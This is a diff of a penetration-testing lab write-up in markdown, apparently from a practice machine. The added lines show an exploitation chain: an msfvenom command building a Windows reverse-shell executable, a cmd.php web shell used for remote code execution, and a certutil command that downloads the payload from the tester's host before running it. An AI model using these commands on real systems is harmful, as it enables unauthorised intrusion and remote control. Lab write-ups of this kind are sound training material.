@@ -456,6 +456,7 @@ Enumerated top 200 UDP ports:
 
 #### - Received an error showing it was vulnerable and has sql database running:
 
+
 ![](Pasted%20image%2020221020192000.png)
 #sqlinjection 
 
@@ -466,13 +467,18 @@ Enumerated top 200 UDP ports:
 
 #### - Created a reverse shell binary on my kali machine by typing "msfvenom -p windows/x64/shell_reverse_tcp -f exe -o rev.exe LHOST=192.168.49.114 LPORT=8000"
 
-![](Pasted%20image%2020221020192215.png)
-
-
-
-
 
 #### - Navigated to "192.168.114.127:45332/cmd.php?cmd=whoami" and confirmed we have remote code execution on the target machine
+
+![](Pasted%20image%2020221020192543.png)
+
+#### - Hosted the rev.exe binary on my kali machine with python
+
+#### - Typed "certutil.exe -urlcache -split -f "http://192.168.49.114/rev.exe" to downoad the reverse shell binary to the target machine
+
+#### - Typed rev.exe to execute the reverse shell binary and received a shell back:
+
+
 
 ---
 
